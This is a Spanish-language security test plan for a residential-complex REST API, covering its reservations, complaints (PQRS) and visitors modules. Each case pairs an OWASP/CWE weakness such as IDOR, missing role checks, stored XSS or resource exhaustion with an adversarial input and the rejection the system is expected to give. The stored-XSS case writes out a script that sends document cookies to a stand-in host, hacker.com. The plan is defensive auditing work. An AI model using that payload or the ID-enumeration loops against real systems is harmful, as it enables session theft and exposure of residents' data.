# Diseño de Auditoría Adversarial: Módulo de Reservas

**Fecha de Análisis:** 28 de Octubre de 2026
**Objetivo:** API REST de Housing Control (`/api/reservas`)
**Superficie de Ataque Evaluada:** endpoints GET y POST, DTO de entrada y capa de servicio.

---

## Caso de Prueba 1: Suplantación de Identidad por BOLA (Broken Object Level Authorization)

| Campo | Contenido |
| :--- | :--- |
| **Hallazgo hipotético** | Un residente malintencionado podría crear reservas a nombre de otro residente modificando el payload JSON. |
| **Vulnerabilidad a investigar** | BOLA / Insecure Direct Object Reference (IDOR). |
| **Evidencia inicial** | `CrearReservaDTO` incluye el campo `cedulaUsuarios`. `ReservaService.crearReserva` lee este campo ciegamente e inserta el registro sin verificar si la cédula coincide con la identidad criptográfica del usuario autenticado. |
| **Referencia** | OWASP API Top 10 (2023) - API1:2023 Broken Object Level Authorization. |
| **Precondiciones** | El atacante (Cédula: 1010000004) está autenticado en el sistema. Conoce o adivina la cédula de un vecino (Ej: 9999999999). |
| **Entrada adversarial** | POST a `/api/reservas` con JSON: `{"zonasComunesId": "uuid-valido", "fechaReserva": "2026-11-20T10:00:00", "cedulaUsuarios": "9999999999"}` |
| **Comportamiento esperado** | El sistema debe rechazar la solicitud (HTTP 403 Forbidden) porque el residente autenticado no tiene autorización para actuar en nombre de la cédula 9999999999. |
| **Evidencia necesaria** | Aserción en prueba de integración (MockMvc) evaluando que el `status().isForbidden()` o verificar que la cédula registrada en BD coincida con el token, no con el DTO. |
| **Límite de interpretación** | Si la prueba falla, demuestra la ausencia de control de autorización a nivel de objeto, pero no evalúa si el sistema es vulnerable a suplantación a nivel de red (ej. robo de tokens). |

---

## Caso de Prueba 2: Validación de Límite Temporal (Viajes en el tiempo)

| Campo | Contenido |
| :--- | :--- |
| **Hallazgo hipotético** | El sistema permite crear reservas en el pasado, lo que podría alterar auditorías, saturar la base de datos o evadir futuros controles de facturación. |
| **Vulnerabilidad a investigar** | Validación de Entradas Insuficiente (Business Logic Flaw). |
| **Evidencia inicial** | `ReservaService.crearReserva` valida que `fechaReserva` no sea nula, pero carece de aserciones temporales comparadas con `LocalDateTime.now()`. |
| **Referencia** | CWE-20: Improper Input Validation. |
| **Precondiciones** | Endpoint de reservas activo y base de datos H2 levantada. |
| **Entrada adversarial** | POST a `/api/reservas` con JSON donde `fechaReserva` es `"1990-01-01T00:00:00"`. |
| **Comportamiento esperado** | El sistema debe rechazar la petición con un error HTTP 400 Bad Request y un mensaje claro de violación lógica. |
| **Evidencia necesaria** | Aserción en prueba unitaria (`ReservaServiceTest`) verificando que se lanza `IllegalArgumentException` o similar al usar una fecha pasada. |
| **Límite de interpretación** | Esta prueba evalúa el límite inferior temporal. No demuestra qué ocurre si se reserva en el año 2099 (límite superior temporal). |

---

## Caso de Prueba 3: Abuso de Recursos / Monopolio de Zonas Comunes

| Campo | Contenido |
| :--- | :--- |
| **Hallazgo hipotético** | Un solo usuario puede reservar la zona de BBQ para todos los días del año, impidiendo que otros residentes la usen. |
| **Vulnerabilidad a investigar** | Unrestricted Resource Consumption (Fallo de Lógica de Negocio). |
| **Evidencia inicial** | Ni el esquema SQL ni `ReservaService` imponen un límite de reservas por cédula. |
| **Referencia** | OWASP API Top 10 (2023) - API4:2023 Unrestricted Resource Consumption. |
| **Precondiciones** | El atacante envía solicitudes automatizadas y válidas en diferentes fechas. |
| **Entrada adversarial** | Un bucle (ej. en un script o test de carga) enviando 100 peticiones POST variando únicamente la `fechaReserva`. |
| **Comportamiento esperado** | Tras `N` reservas permitidas (ej. máximo 2 por semana), el sistema debe retornar HTTP 429 Too Many Requests o HTTP 409 Conflict. |
| **Evidencia necesaria** | Aserción que falle al intentar crear la reserva `N+1`. |
| **Límite de interpretación** | Esto depende netamente de los requisitos del negocio. Si el Product Owner no definió un límite de reservas, esto es un riesgo aceptado, no un bug de código per se. |

# Diseño de Auditoría Adversarial: Módulo de PQRS

**Fecha de Análisis:** 28 de Octubre de 2026
**Objetivo:** API REST de Housing Control (`/api/pqrs`)
**Superficie de Ataque Evaluada:** endpoints GET, POST y PUT, DTOs de entrada, validaciones de servicio y persistencia.

## Caso de Prueba 1: IDOR / Lectura No Autorizada de PQRS (BOLA)

| Campo | Contenido | 
| ----- | ----- | 
| **Hallazgo hipotético** | Un residente puede leer las quejas, reclamos y respuestas de administración de otros residentes. | 
| **Vulnerabilidad a investigar** | BOLA / Insecure Direct Object Reference (IDOR). | 
| **Evidencia inicial** | El endpoint `GET /api/pqrs/residente/{cedula}` recibe la cédula directamente por la URL. No hay evidencia en el código de que el controlador verifique si el usuario autenticado (token) es el dueño de esa cédula o si tiene rol de administrador. | 
| **Referencia** | OWASP API Top 10 (2023) - API1:2023 Broken Object Level Authorization. | 
| **Precondiciones** | El atacante tiene acceso al sistema (Cédula: 1010000004). Existe otro residente (Cédula: 5555555) con quejas sensibles contra el administrador. | 
| **Entrada adversarial** | Solicitud HTTP: `GET /api/pqrs/residente/5555555` utilizando el token de autorización del atacante. | 
| **Comportamiento esperado** | El sistema debe rechazar la solicitud (HTTP 403 Forbidden). Un residente solo debe poder consultar sus propias PQRS. | 
| **Evidencia necesaria** | Aserción en prueba de integración (MockMvc) evaluando un `status().isForbidden()` o `status().isUnauthorized()` al enviar credenciales del usuario A hacia la URL del usuario B. | 
| **Límite de interpretación** | Esta prueba confirma si existe fuga de datos horizontal, pero no verifica si la tabla en la base de datos está encriptada. | 

## Caso de Prueba 2: Modificación de Estado (Escalada de Privilegios / MFLAC)

| Campo | Contenido | 
| ----- | ----- | 
| **Hallazgo hipotético** | Un residente molesto porque no atienden su PQRS podría usar la API para marcar su propia queja (o la de otros) como "RESUELTA" inyectando una respuesta falsa. | 
| **Vulnerabilidad a investigar** | Missing Function Level Access Control (MFLAC). | 
| **Evidencia inicial** | El endpoint `PUT /api/pqrs/{id}` permite cambiar el estado y la respuesta de una PQRS. En el código proporcionado no hay anotaciones como `@PreAuthorize("hasRole('ADMIN')")` que restrinjan explícitamente quién puede consumir esta ruta. | 
| **Referencia** | OWASP API Top 10 (2023) - API5:2023 Broken Function Level Authorization. | 
| **Precondiciones** | El atacante es un residente estándar. Conoce el UUID de una PQRS (puede ser el de su propia queja). | 
| **Entrada adversarial** | Solicitud HTTP con token de residente: `PUT /api/pqrs/{uuid-valido}` con JSON: `{"estado": "RESUELTA", "respuesta": "Se autoriza el reembolso."}` | 
| **Comportamiento esperado** | El controlador de Spring Security debe interceptar la petición y devolver HTTP 403 Forbidden antes de que toque el `PqrsService`. | 
| **Evidencia necesaria** | Aserción que confirme el rechazo y verifique en H2 que el estado original de la PQRS no fue alterado. | 
| **Límite de interpretación** | Si la prueba pasa, demuestra que el endpoint carece de seguridad por rol, pero no indica de quién es la falla (si del filtro de Spring Security o del controlador). | 

## Caso de Prueba 3: Inyección de Código / XSS Almacenado

| Campo | Contenido | 
| ----- | ----- | 
| **Hallazgo hipotético** | Un atacante podría registrar una queja que contenga código JavaScript. Cuando el administrador abra su panel web para leer la queja, su navegador ejecutará el código malicioso. | 
| **Vulnerabilidad a investigar** | Stored Cross-Site Scripting (XSS). | 
| **Evidencia inicial** | `PqrsService.crearPqrs` valida que el `asunto` y `descripcion` no estén vacíos (`!isBlank()`), pero no sanea caracteres especiales (ej. `<script>`) antes de guardarlos en la base de datos (campo `TEXT`). | 
| **Referencia** | CWE-79: Improper Neutralization of Input During Web Page Generation (XSS). | 
| **Precondiciones** | La aplicación web administrativa renderizará los textos de las PQRS en el navegador sin escapar el HTML. | 
| **Entrada adversarial** | POST a `/api/pqrs` con JSON: `{"asunto": "Ayuda", "descripcion": "<script>fetch('http://hacker.com/steal?cookie='+document.cookie)</script>", "cedulaUsuarios": "1010000004"}` | 
| **Comportamiento esperado** | Dependiendo del enfoque defensivo: la API debería rechazar caracteres maliciosos (HTTP 400), o sanitizar la entrada (eliminar los tags HTML), o garantizar mediante política que el Frontend escape la salida. | 
| **Evidencia necesaria** | Prueba unitaria o de integración verificando el rechazo del payload o la codificación de los caracteres antes del `save()`. | 
| **Límite de interpretación** | Las APIs REST por sí mismas no "sufren" de XSS, ya que no renderizan HTML. Esta vulnerabilidad se materializa puramente en el cliente Frontend. | 

## Caso de Prueba 4: Agotamiento de Memoria (Denegación de Servicio Lógica)

| Campo | Contenido | 
| ----- | ----- | 
| **Hallazgo hipotético** | Un usuario podría enviar un DTO donde la descripción tenga el tamaño de un libro entero (ej. 10 Megabytes), consumiendo memoria de la JVM, saturando el ancho de banda y el almacenamiento. | 
| **Vulnerabilidad a investigar** | Unrestricted Resource Consumption (DoS Lógico). | 
| **Evidencia inicial** | El campo `descripcion` en el DTO es un `String` genérico, y en la BD es tipo `TEXT`. No hay aserciones sobre la longitud máxima de la cadena en `PqrsService` ni en el DTO (como `@Size(max = 2000)`). | 
| **Referencia** | OWASP API Top 10 (2023) - API4:2023 Unrestricted Resource Consumption. | 
| **Precondiciones** | El atacante envía una solicitud HTTP con un body maliciosamente inflado. | 
| **Entrada adversarial** | POST a `/api/pqrs` donde el valor de `descripcion` es una cadena de 5 millones de caracteres `A`. | 
| **Comportamiento esperado** | El controlador o la capa de validación (`@Valid`) debe truncar la petición temprano y devolver un HTTP 400 Bad Request. | 
| **Evidencia necesaria** | El servidor no debe crashear, y la base de datos no debe almacenar el registro masivo. | 
| **Límite de interpretación** | No mide ataques volumétricos DDoS a nivel de red, sino vulnerabilidades algorítmicas de procesamiento en el framework. | 

# Diseño de Auditoría Adversarial: Módulo de Visitantes

**Fecha de Análisis:** 28 de Octubre de 2026
**Objetivo:** API REST de Housing Control (`/api/visitantes`)
**Superficie de Ataque Evaluada:** endpoints POST, GET y PUT, DTO de entrada, reglas de servicio y mapeo de esquema BD.

## Caso de Prueba 1: Falsificación de Identidad en Registro (BOLA)

| Campo | Contenido | 
| ----- | ----- | 
| **Hallazgo hipotético** | Un residente malintencionado puede registrar visitantes a nombre de otro apartamento/residente, eludiendo la responsabilidad si el visitante comete una infracción en el conjunto. | 
| **Vulnerabilidad a investigar** | BOLA / Insecure Direct Object Reference (IDOR). | 
| **Evidencia inicial** | `RegistrarVisitanteDTO` exige `cedulaUsuarios`. El método `VisitanteService.registrar` valida que el residente exista en BD (`usuarioRepository.existsById`), pero no valida que la `cedulaUsuarios` del JSON corresponda al residente que envía el token HTTP. | 
| **Referencia** | OWASP API Top 10 (2023) - API1:2023 Broken Object Level Authorization. | 
| **Precondiciones** | El atacante (Residente A) está autenticado. Conoce la cédula del Residente B. | 
| **Entrada adversarial** | POST a `/api/visitantes` con JSON: `{"nombre": "Hacker", "cedula": "000", "tipoDocumento": "CC", "fechaPrevista": "2026-11-01T10:00:00", "cedulaUsuarios": "CEDULA_DEL_VECINO"}` | 
| **Comportamiento esperado** | El sistema debe identificar la discrepancia entre el token del atacante y el payload, retornando HTTP 403 Forbidden. | 
| **Evidencia necesaria** | Aserción en prueba de integración (MockMvc) evaluando el rechazo de la solicitud al intentar inyectar una cédula ajena. | 
| **Límite de interpretación** | Si la prueba pasa, demuestra que el sistema confía ciegamente en el payload, pero no indica si el atacante podría borrar el visitante después. | 

## Caso de Prueba 2: Evasión de Control Perimetral (MFLAC)

| Campo | Contenido | 
| ----- | ----- | 
| **Hallazgo hipotético** | Un residente puede marcar manualmente el "ingreso" de su propio visitante llamando a la API desde su celular, sin que el visitante pase por la portería. | 
| **Vulnerabilidad a investigar** | Missing Function Level Access Control (MFLAC) / Escalada de Privilegios Horizontal a Vertical. | 
| **Evidencia inicial** | El endpoint `PUT /api/visitantes/{id}/ingreso` no posee anotaciones de seguridad por roles (ej. `@PreAuthorize`). El controlador expone la ruta a cualquier usuario autenticado de la red. | 
| **Referencia** | OWASP API Top 10 (2023) - API5:2023 Broken Function Level Authorization. | 
| **Precondiciones** | El atacante (Residente) registra un visitante y captura el UUID generado. | 
| **Entrada adversarial** | Solicitud HTTP PUT a `/api/visitantes/{uuid_capturado}/ingreso` firmada con el token JWT del Residente. | 
| **Comportamiento esperado** | El filtro de seguridad debe exigir el rol `PORTERIA` o `ADMIN` y devolver HTTP 403 Forbidden al Residente. | 
| **Evidencia necesaria** | Prueba de integración verificando que solo un usuario *mockeado* con rol de Portero pueda obtener un HTTP 200 OK. | 
| **Límite de interpretación** | Esta prueba confirma si el endpoint está expuesto, pero no comprueba si un Portero podría dar ingreso a visitantes de un conjunto residencial ajeno (si existiera multitenencia). | 

## Caso de Prueba 3: Evasión de Constraints e Inyección de Tipos (Mass Assignment / Bad Data)

| Campo | Contenido | 
| ----- | ----- | 
| **Hallazgo hipotético** | Un atacante podría enviar tipos de documento inválidos o payloads masivos que fuercen una excepción de base de datos no controlada, exponiendo el Stack Trace (divulgación de información). | 
| **Vulnerabilidad a investigar** | Improper Input Validation / Divulgación de Información de Infraestructura. | 
| **Evidencia inicial** | En el DTO, `tipoDocumento` es un `String` genérico. El servicio solo usa `esVacio(dto.tipoDocumento())`. Sin embargo, en PostgreSQL, esta columna está estrictamente atada a `tipo_documento_enum` ('CC', 'CE', 'NIT', 'PASAPORTE'). | 
| **Referencia** | OWASP API Top 10 (2023) - API8:2023 Security Misconfiguration. | 
| **Precondiciones** | El entorno de pruebas está conectado a H2 (o PostgreSQL) y no existe un `@ControllerAdvice` global que oculte las excepciones `DataIntegrityViolationException` para este endpoint. | 
| **Entrada adversarial** | POST a `/api/visitantes` con `"tipoDocumento": "TARJETA_DE_IDENTIDAD_FALSA_O_PAYLOAD_XSS_LARGO"`. | 
| **Comportamiento esperado** | La API debe interceptar el valor inválido *antes* de enviarlo a la BD y devolver HTTP 400 Bad Request con un mensaje limpio. | 
| **Evidencia necesaria** | Aserción verificando que la respuesta es HTTP 400, y que el cuerpo de la respuesta NO contiene nombres de tablas, columnas o el nombre del Enum interno de la base de datos. | 
| **Límite de interpretación** | Esta prueba no evalúa inyección SQL directamente, ya que JPA/Hibernate previene la inyección, pero sí evalúa la fuga de datos por errores técnicos expuestos. | 

## Caso de Prueba 4: Extracción de Datos de Terceros (Data Scraping)

| Campo | Contenido | 
| ----- | ----- | 
| **Hallazgo hipotético** | Cualquier persona con acceso a la API (incluso otro residente) podría introducir números de cédula aleatorios para descubrir quién visita a quién en el conjunto. | 
| **Vulnerabilidad a investigar** | Broken Object Level Authorization (Lectura) / Data Exposure. | 
| **Evidencia inicial** | `GET /api/visitantes/buscar/{cedula}` retorna una lista de visitantes y la cédula del residente (`cedulaUsuarios`). No hay control sobre quién hace la consulta. | 
| **Referencia** | OWASP API Top 10 (2023) - API1:2023 y API3:2023 (Broken Object Property Level Authorization). | 
| **Precondiciones** | El atacante tiene un token válido de residente. Existen visitantes registrados por otros vecinos. | 
| **Entrada adversarial** | Bucle realizando peticiones GET a `/api/visitantes/buscar/{cedula_aleatoria}`. | 
| **Comportamiento esperado** | El endpoint debe restringirse (ej. `hasRole('PORTERIA')`) o, si un residente puede buscar, el backend solo debe devolver los visitantes asociados a su propio apartamento. | 
| **Evidencia necesaria** | Rechazo HTTP 403 o filtro efectivo que retorne lista vacía si un residente busca la cédula del visitante de otro vecino. | 
| **Límite de interpretación** | No comprueba vulneraciones por enumeración de UUIDs (que es estadísticamente improbable), sino por enumeración de documentos de identidad. | 

